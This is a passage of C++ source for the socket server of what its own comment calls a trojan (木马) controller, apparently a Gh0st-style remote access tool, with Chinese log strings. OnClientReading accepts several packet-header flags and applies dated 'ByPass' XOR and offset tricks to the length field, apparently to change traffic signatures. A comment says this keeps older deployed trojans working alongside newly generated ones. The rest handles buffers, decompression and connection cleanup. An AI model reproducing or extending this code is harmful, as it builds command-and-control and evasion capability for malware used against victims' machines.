	PostQueuedCompletionStatus(m_hCompletionPort, 0, (DWORD) pContext, &pOverlap->m_ol);
	
	pContext->m_nMsgOut++;


#ifdef _MYDEBUG1

	LOG((LEVEL_FUNC_IN_OUT,"Send Leaving...(%08x,%08x)%08x\n",pContext,pContext->m_Socket,nSize));

#endif

}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CClientListener::OnClientInitializing
// 
// DESCRIPTION:	Called when client is initailizing
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund           09062001		       Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::OnClientInitializing(ClientContext* pContext, DWORD dwIoSize)
{
	// We are not actually doing anything here, but we could for instance make
	// a call to Send() to send a greeting message or something

	return TRUE;		// make sure to issue a read after this
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::OnClientReading
// 
// DESCRIPTION:	Called when client is reading 
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund           09062001		       Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////




bool CIOCPServer::OnClientReading(ClientContext* pContext, DWORD dwIoSize)
{

	
#ifdef _MYDEBUG1

	LOG((LEVEL_INFO,"接收到数据 \tThread=%08x\n",GetCurrentThreadId()));	
	LOG((LEVEL_INFO,"\t m_socket=%08x dwIoSize=%08x\n",pContext->m_Socket,dwIoSize));
	LOG((LEVEL_INFO,"\t Flag=%c%c%c%c%c IoSize=%08x UnCompressSize=%08x\n",
		pContext->m_byInBuffer[0],
		pContext->m_byInBuffer[1],pContext->m_byInBuffer[2],
		pContext->m_byInBuffer[3],pContext->m_byInBuffer[4],
		*((int*)(pContext->m_byInBuffer+5)),*((int*)(pContext->m_byInBuffer+9)) ));	

#endif

	//CLock cs(CIOCPServer::m_cs, "OnClientReading");
	try
	{		
		static DWORD nLastTick = GetTickCount();
		static DWORD nBytes = 0;
		nBytes += dwIoSize;
		
		
		if (GetTickCount() - nLastTick >= 1000)
		{
			nLastTick = GetTickCount();
			InterlockedExchange((LPLONG)&(m_nRecvKbps), nBytes);
			nBytes = 0;
		}
	
	
		if (dwIoSize == 0)
		{
			LOG((LEVEL_WARNNING,"dwIoSize == 0，正在关闭连接(%08x,%08x)\n",pContext,pContext->m_Socket));
			RemoveStaleClient(pContext, FALSE,TRUE);
			return FALSE;
		}

		
		if (dwIoSize == FLAG_SIZE && memcmp(pContext->m_byInBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// 重新发送
			LOG((LEVEL_INFO,"\t Resend\n"));
			Send(pContext, pContext->m_ResendWriteBuffer.GetBuffer(), pContext->m_ResendWriteBuffer.GetBufferLen());
			// 必须再投递一个接收请求
			PostRecv(pContext);
			return TRUE;
		}
		
		// Add the message to out message
		// Dont forget there could be a partial, 1, 1 or more + partial mesages

		if(!pContext->m_CompressionBuffer.Write(pContext->m_byInBuffer,dwIoSize))
		{
			LOG((LEVEL_WARNNING,"\t Write error\n"));
			return FALSE;
		}


#ifdef _MYDEBUG1

		LOG((LEVEL_INFO,"\t OnClientReading m_pNotifyProc\n"));

#endif

		m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_RECEIVE);


#ifdef _MYDEBUG1

		LOG((LEVEL_INFO,"\t OnClientReading m_pNotifyProc end\n"));


#endif
	   ASSERT(pContext->m_CompressionBuffer.GetBufferLen() > FLAG_SIZE);
	   BYTE bPacketFlag[FLAG_SIZE];
	   CopyMemory(bPacketFlag, pContext->m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
	   int i_HDR_SIZE = 30;
	   if (memcmp(m_bPacketFlag6, bPacketFlag, sizeof(m_bPacketFlag6)) == 0)
	   {
		    //如果是新的标示，则使用HDR_SIZE为18，否则为30，保持111上的老版本木马能用，以后生成的木马使用新标示，新版本木马
		   //控制功能可用HDR_SIZE为18
		   i_HDR_SIZE = 18;
	   }
		// Check real Data
		while (pContext->m_CompressionBuffer.GetBufferLen() > i_HDR_SIZE)
		{
			BYTE bPacketFlag[FLAG_SIZE];

				CopyMemory(bPacketFlag, pContext->m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));

#ifdef _MYDEBUG1

		LOG((LEVEL_INFO,"\t OnClientReading...\n"));

#endif


			//BYTE bPacketFlag2[] = {'F', 'U', 'C', 'K', '3'};

			BOOL bByPass=FALSE; 
			BOOL bByPass_20140516=FALSE; //add  by zhenyu
			BOOL bByPass_20140925=FALSE; //add  by zhenyu
			BOOL bByPass_20141107=FALSE; //add  by zhenyu

			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
			{
				if (memcmp(m_bPacketFlag2, bPacketFlag, sizeof(m_bPacketFlag2)) == 0)
				{

					bByPass=TRUE;
				}
				else if (memcmp(m_bPacketFlag3, bPacketFlag, sizeof(m_bPacketFlag3)) == 0)
				{

					bByPass_20140516=TRUE;
				}
				else if (memcmp(m_bPacketFlag4, bPacketFlag, sizeof(m_bPacketFlag4)) == 0)
				{

					bByPass_20140925=TRUE;
				}
				else if (memcmp(m_bPacketFlag5, bPacketFlag, sizeof(m_bPacketFlag5)) == 0)
				{

					bByPass_20141107=TRUE;
				}
				else if (memcmp(m_bPacketFlag6, bPacketFlag, sizeof(m_bPacketFlag6)) == 0)
				{

					bByPass_20141107=TRUE;
				}
                else 
				{
					g_log.Log(0,"\t 数据头格式错误！！！%d\n",__LINE__);
					throw "bad buffer";

				}

			}

			

#ifdef _MYDEBUG1


		LOG((LEVEL_INFO,"\t OnClientReading...\n"));
#endif
			int nSize = 0;
			CopyMemory(&nSize, pContext->m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));

#ifdef _MYDEBUG1
			
		LOG((LEVEL_INFO,"\t OnClientReading...\n"));

#endif

			if (bByPass)
			{
				
				nSize ^=0xff;
			}

             //add by zhenyu
			if (bByPass_20140516)
			{
				//nSize += 13;
				nSize -=0x77AD;
				nSize ^=0xE8;
			}

			if (bByPass_20140925)
			{
				nSize -=0xFF00;
				nSize ^=0xA4;
			}
			if (bByPass_20141107)   
			{
				nSize -=0xFA97;
				nSize ^=0xF4;
			}

			// add end

#ifdef _MYDEBUG1


		LOG((LEVEL_INFO,"\t OnClientReading...\n"));

#endif

			// Update Process Variable

			pContext->m_nTransferProgress = pContext->m_CompressionBuffer.GetBufferLen() * 100 / nSize;

			//LOG((LEVEL_INFO,"\t111111111111\n"));

			if (nSize && (pContext->m_CompressionBuffer.GetBufferLen()) >= nSize)
			{

				//LOG((LEVEL_INFO,"\t22222222\n"));

				int nUnCompressLength = 0;
				// Read off header
				pContext->m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));
				pContext->m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
				if (bByPass)
				{
					nSize ^=0xff;
				}
				//add by zhenyu
				if (bByPass_20140516)  //改两处
				{
					//nSize += 13;
					nSize -=0x77AD;
					nSize ^=0xE8;	
				}
				if (bByPass_20140925) 
				{
					nSize -=0xFF00;
					nSize ^=0xA4;
				}

				if (bByPass_20141107)   
				{
					nSize -=0xFA97;
					nSize ^=0xF4;
				}
				// add end

#ifdef _MYDEBUG1

		LOG((LEVEL_INFO,"\t OnClientReading...\n"));
#endif
				pContext->m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));

#ifdef _MYDEBUG1
		
		LOG((LEVEL_INFO,"\t OnClientReading...\n"));

#endif
				////////////////////////////////////////////////////////
				////////////////////////////////////////////////////////
				// SO you would process your data here
				// 
				// I'm just going to post message so we can see the data

				int	nCompressLength = nSize - i_HDR_SIZE;

				PBYTE pData = new BYTE[nCompressLength];
				PBYTE pDeCompressionData = new BYTE[nUnCompressLength];
				
				if (pData == NULL || pDeCompressionData == NULL)
				{
					g_log.Log(0,"\t 分配内存错误！！！%d\n",__LINE__);
					throw "bad Allocate";
				}

#ifdef _MYDEBUG1

				LOG((LEVEL_INFO,"\t OnClientReading...\n"));

#endif

				pContext->m_CompressionBuffer.Read(pData, nCompressLength);

#ifdef _MYDEBUG1

				LOG((LEVEL_INFO,"\t OnClientReading...\n"));

#endif

				//////////////////////////////////////////////////////////////////////////
				BitManipulation(pData,nCompressLength,pData);


				/////////////////////////////////////////////////解压之前先解密

				unsigned long	destLen = nUnCompressLength;
				int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);


#ifdef _MYDEBUG1

				LOG((LEVEL_INFO,"\t OnClientReading...\n"));
#endif

				//////////////////////////////////////////////////////////////////////////
				if (nRet == Z_OK)
				{
					pContext->m_DeCompressionBuffer.ClearBuffer();
					if(!pContext->m_DeCompressionBuffer.Write(pDeCompressionData, destLen))
					{
						return 0;
					}

					
					m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_RECEIVE_COMPLETE);
					
				}
				else
				{
					g_log.Log(0,"\t 解压缩错误！！！%d\n",__LINE__);
					throw "bad buffer";
				}

#ifdef _MYDEBUG1

				LOG((LEVEL_INFO,"\t OnClientReading...\n"));

#endif

				delete [] pData;
				delete [] pDeCompressionData;
				pContext->m_nMsgIn++;
			}
			else
			{
				
		

					if(!nSize)
					{
						
						LOG((LEVEL_INFO,"\t接收到的数据长度为0\n"));
					}
					else if((pContext->m_CompressionBuffer.GetBufferLen()) >= nSize)
					{

						LOG((LEVEL_INFO,"\t接收到的数据长度为大于正常长度\n"));

					}
				
				
				
				
				break;
			}
		}
		// Post to WSARecv Next
		PostRecv(pContext);
	}catch(...)
	{
		LOG((LEVEL_ERROR,"\tException."));
		pContext->m_CompressionBuffer.ClearBuffer();

		// 要求重发，就发送0, 内核自动添加数包标志

		LOG((LEVEL_INFO,"\t要求重发\n"));

		Send(pContext, NULL, 0);
		PostRecv(pContext);
		return FALSE;
	}

	


	return TRUE;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::OnClientWriting
// 
// DESCRIPTION:	Called when client is writing
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// Ulf Hedlund           09062001		       Changes for OVERLAPPEDPLUS
////////////////////////////////////////////////////////////////////////////////
bool CIOCPServer::OnClientWriting(ClientContext* pContext, DWORD dwIoSize)
{
	
#ifdef _MYDEBUG1

	LOG((LEVEL_FUNC_IN_OUT,"OnClientWriting(%x,%x)\n",pContext,dwIoSize));

#endif

		
	static DWORD nLastTick = GetTickCount();
	static DWORD nBytes = 0;
	
	nBytes += dwIoSize;
	
	if (GetTickCount() - nLastTick >= 1000)
	{
		nLastTick = GetTickCount();
		InterlockedExchange((LPLONG)&(m_nSendKbps), nBytes);
		nBytes = 0;
	}		
	
	ULONG ulFlags = MSG_PARTIAL;

	// Finished writing - tidy up	
	if(!pContext->m_WriteBuffer.Delete(dwIoSize))
	{
		LOG((LEVEL_ERROR,"Delete(%d) error\n",dwIoSize));			
		return FALSE;
	}
	
		
	if (pContext->m_WriteBuffer.GetBufferLen() == 0)
	{
		

#ifdef _MYDEBUG1

		LOG((LEVEL_INFO,"WriteBufferLen() == 0\n"));
#endif

		pContext->m_WriteBuffer.ClearBuffer();
		
		// Write complete

#ifdef _MYDEBUG1

		LOG((LEVEL_INFO,"WriteComplete,SetEvent() Call\n"));
#endif

		SetEvent(pContext->m_hWriteComplete);
		return TRUE;			// issue new read after this one
	}
	else
	{
		OVERLAPPEDPLUS * pOverlap = new OVERLAPPEDPLUS(IOWrite);
		if( !pOverlap )
		{
			LOG((LEVEL_ERROR,"Memory Alloc Error.\n"));
			return FALSE;
		}
		
		m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_TRANSMIT);


#ifdef _MYDEBUG1

		LOG((LEVEL_INFO,"NotifyProc() called\n"));

#endif
		
		pContext->m_wsaOutBuffer.buf = (char*) pContext->m_WriteBuffer.GetBuffer();
		pContext->m_wsaOutBuffer.len = pContext->m_WriteBuffer.GetBufferLen();

#ifdef _MYDEBUG1

		LOG((LEVEL_INFO,"WSASend(%x,%x)\n",&pContext->m_wsaOutBuffer,&pContext->m_wsaOutBuffer.len));

#endif

		int nreturn = WSASend(pContext->m_Socket, 
						&pContext->m_wsaOutBuffer,
						1,
						&pContext->m_wsaOutBuffer.len, 
						ulFlags,
						&pOverlap->m_ol, 
						NULL);
		
		if ( nreturn == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING )
		{
			LOG((LEVEL_WARNNING,"Send 发生错误，正在关闭连接(%08x,%08x)\n",pContext,pContext->m_Socket));
			RemoveStaleClient( pContext, FALSE,TRUE );
		}
	}

#ifdef _MYDEBUG1

	LOG((LEVEL_FUNC_IN_OUT,"OnClientWriting end\n"));

#endif

	return FALSE;			// issue new read after this one
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::CloseCompletionPort
// 
// DESCRIPTION:	Close down the IO Complete Port, queue and associated client context structs
//				which in turn will close the sockets...
//				
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::CloseCompletionPort()
{

//	while (m_nWorkerCnt)
	{
		PostQueuedCompletionStatus(m_hCompletionPort, 0, (DWORD) NULL, NULL);
		Sleep(100);
	}

	// Close the CompletionPort and stop any more requests

	ClientContext* pContext = NULL;

	
	do 
	{
		m_listlock.WaitToRead();
		POSITION pos  = m_listContexts.GetHeadPosition();
		m_listlock.Done();
		if (pos)
		{
			m_listlock.WaitToRead();
			pContext = m_listContexts.GetNext(pos);	
			m_listlock.Done();
			g_log.Log(0,"CloseCompletionPort调用，正在关闭连接(%08x,%08x)\n",pContext,pContext->m_Socket);
			RemoveStaleClient(pContext, FALSE,FALSE);
		}
	}while (!m_listContexts.IsEmpty());
	m_listlock.WaitToWrite();
	m_listContexts.RemoveAll();
	m_listlock.Done();
	CloseHandle(m_hCompletionPort);


}


BOOL CIOCPServer::AssociateSocketWithCompletionPort(SOCKET socket, HANDLE hCompletionPort, DWORD dwCompletionKey)
{
	HANDLE h = CreateIoCompletionPort((HANDLE) socket, hCompletionPort, dwCompletionKey, 0);
	return h == hCompletionPort;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::RemoveStaleClient
// 
// DESCRIPTION:	Client has died on us, close socket and remove context from our list
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::RemoveStaleClient(ClientContext* pContext, BOOL bGraceful,BOOL bNotifyClient)
{
    //CLock cs(m_cs, "RemoveStaleClient");

	TRACE("CIOCPServer::RemoveStaleClient\n");

    LINGER lingerStruct;


    //
    // If we're supposed to abort the connection, set the linger value
    // on the socket to 0.
    //

    if ( !bGraceful ) 
	{

        lingerStruct.l_onoff = 1;
        lingerStruct.l_linger = 0;
        setsockopt( pContext->m_Socket, SOL_SOCKET, SO_LINGER,
                    (char *)&lingerStruct, sizeof(lingerStruct) );
    }



    //
    // Free context structures
	if (m_listContexts.Find(pContext)) 
	{
		//
		// Now close the socket handle.  This will do an abortive or  graceful close, as requested.  

			LOG((LEVEL_INFO,"删除连接pContext=%08x;m_Socket=%08x;ip=%s(%d)\n",pContext,pContext->m_Socket,inet_ntoa(pContext->m_saClient.sin_addr),m_listContexts.GetCount()));
			
			GetLocalTime(&pContext->m_lastCloseTime);
			if(bNotifyClient)
				m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_CLIENT_DISCONNECT);

			if(pContext->m_Socket!=INVALID_SOCKET)
			{
				LOG((LEVEL_INFO,"RemoveStaleClient\n"));
				while (!HasOverlappedIoCompleted((LPOVERLAPPED)pContext)) 
					Sleep(0);

				g_log.Log(0,"\t RemoveStaleClient%d\n",__LINE__);
				if(!CancelIo((HANDLE) pContext->m_Socket))
				{
					LOG((LEVEL_WARNNING,"CancelIo %s()::%08x 发现异常！！！\n",__FUNCTION__,GetLastError()));
				}
				pContext->m_socketlock.WaitToWrite();
				shutdown(pContext->m_Socket,SD_BOTH);
				closesocket( pContext->m_Socket );
				pContext->m_Socket = INVALID_SOCKET;
				pContext->m_socketlock.Done();
			}
	//		g_log.Log(0,"\t RemoveStaleClient%d\n",__LINE__);

			MoveToFreePool(pContext);
		//	g_log.Log(0,"\t RemoveStaleClient%d\n",__LINE__);
	}
}


void CIOCPServer::Shutdown()
{
	if (m_bInit == FALSE)
		return;

	m_bInit = FALSE;
	m_bTimeToKill = TRUE;

	// Stop the listener
	CloseCompletionPort();
	Stop();


	closesocket(m_socListen);	
	WSACloseEvent(m_hEvent);


	
	DeleteCriticalSection(&m_cs);

	m_listlock.WaitToWrite();
 	while (!m_listFreePool.IsEmpty())
 		delete m_listFreePool.RemoveTail();
	m_listlock.Done();

}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::MoveToFreePool
// 
// DESCRIPTION:	Checks free pool otherwise allocates a context
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::MoveToFreePool(ClientContext *pContext)
{
	//CLock cs(m_cs, "MoveToFreePool");
    // Free context structures
	POSITION pos = m_listContexts.Find(pContext);
	if (pos) 
	{
		pContext->m_WriteBuffer.ClearBuffer();
		pContext->m_ResendWriteBuffer.ClearBuffer();
		pContext->m_CompressionBuffer.ClearBuffer();
		pContext->m_DeCompressionBuffer.ClearBuffer();
		m_listlock.WaitToWrite();
		m_listFreePool.AddTail(pContext);
		m_listContexts.RemoveAt(pos);
		m_listlock.Done();
	}
}



////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::MoveToFreePool
// 
// DESCRIPTION:	Moves an 'used/stale' Context to the free pool for reuse
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
ClientContext*  CIOCPServer::AllocateContext()
{
	ClientContext* pContext = NULL;

	//CLock cs(CIOCPServer::m_cs, "AllocateContext");

	m_listlock.WaitToWrite();
	if (!m_listFreePool.IsEmpty())
	{
		pContext = m_listFreePool.RemoveHead();
		g_log.Log(0,"重新使用内存(%08x,%08x)\n",pContext,pContext->m_Socket);

	}
	else
	{
		pContext = new ClientContext;
	}
	g_log.Log(0,"socketlist count=%08x,free list count=%08x\n",m_listContexts.GetSize(),m_listFreePool.GetSize());

	m_listlock.Done();

	ASSERT(pContext);
	
	if (pContext != NULL)
	{
		ZeroMemory(pContext, sizeof(ClientContext));
		pContext->m_bIsMainSocket = FALSE;
		memset(pContext->m_Dialog, 0, sizeof(pContext->m_Dialog));
	}
	return pContext;
}


void CIOCPServer::ResetConnection(ClientContext* pContext)
{

	CString strHost;
	ClientContext* pCompContext = NULL;

	//CLock cs(CIOCPServer::m_cs, "ResetConnection");

	m_listlock.WaitToRead();
	POSITION pos  = m_listContexts.GetHeadPosition();
	while (pos)
	{
		pCompContext = m_listContexts.GetNext(pos);			
		if (pCompContext == pContext)
		{
			g_log.Log(0,"ResetConnection，正在关闭连接(%08x,%08x)\n",pContext,pContext->m_Socket);
			RemoveStaleClient(pContext, TRUE,FALSE);
			break;
		}
	}
	m_listlock.Done();
}

void CIOCPServer::DisconnectAll()
{
	m_bDisconnectAll = TRUE;
	CString strHost;
	ClientContext* pContext = NULL;

	//CLock cs(CIOCPServer::m_cs, "DisconnectAll");

	m_listlock.WaitToRead();
	POSITION pos  = m_listContexts.GetHeadPosition();
	while (pos)
	{
		pContext = m_listContexts.GetNext(pos);
		g_log.Log(0,"DisconnectAll，正在关闭连接(%08x,%08x)\n",pContext,pContext->m_Socket);
		RemoveStaleClient(pContext, TRUE,FALSE);
	}
	m_bDisconnectAll = FALSE;
	m_listlock.Done();

}

bool CIOCPServer::IsRunning()
{
	return m_bInit;
}
